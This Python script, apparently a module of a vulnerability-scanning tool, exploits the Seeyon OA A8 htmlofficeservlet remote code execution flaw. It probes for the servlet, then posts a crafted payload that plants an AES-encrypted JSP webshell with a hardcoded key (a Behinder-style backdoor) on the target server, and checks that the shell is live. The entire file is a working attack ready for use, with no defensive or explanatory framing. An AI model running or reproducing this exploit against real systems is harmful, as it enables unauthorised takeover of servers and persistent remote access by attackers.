import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def get_shell(target_url):
    print(Vcolors.OKGREEN + "[INFO] 开始写入webshell"+ Vcolors.ENDC)
    vuln_url = target_url + "seeyon/htmlofficeservlet"
    payload = '''DBSTEP V3.0     351             0               533             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdbHthwalGcRu5nHzs\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>6e4f045d4b8506bf492ada7e3390d7ce'''
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.post(vuln_url, headers=headers, data=payload, timeout=5)
        shell_url = target_url + 'seeyon/zz11uunn.jsp'
        response = requests.get(shell_url, timeout=5)
        if response.status_code == 200:
            print(Vcolors.RED + "[+] 冰蝎三默认webshell写入成功: {}".format(shell_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 写入webshell失败, 可进行手动检测" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[x] 写入webshell失败" + Vcolors.ENDC)


def 致远OA_A8_htmlofficeservlet_RCE(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "seeyon/htmlofficeservlet"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    requests.packages.urllib3.disable_warnings()
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'htmoffice' in response.text:
            print(Vcolors.RED + "[INFO] 检测存在 htmlofficeservlet 页面" + vuln_url + Vcolors.ENDC)
            get_shell(urldata)
        else:
            print(Vcolors.WARNING + "[x] 不存在 htmlofficeservlet 页面" +Vcolors.ENDC)
    except:
        logging.error("致远OA_A8_htmlofficeservlet_RCE脚本出现异常")

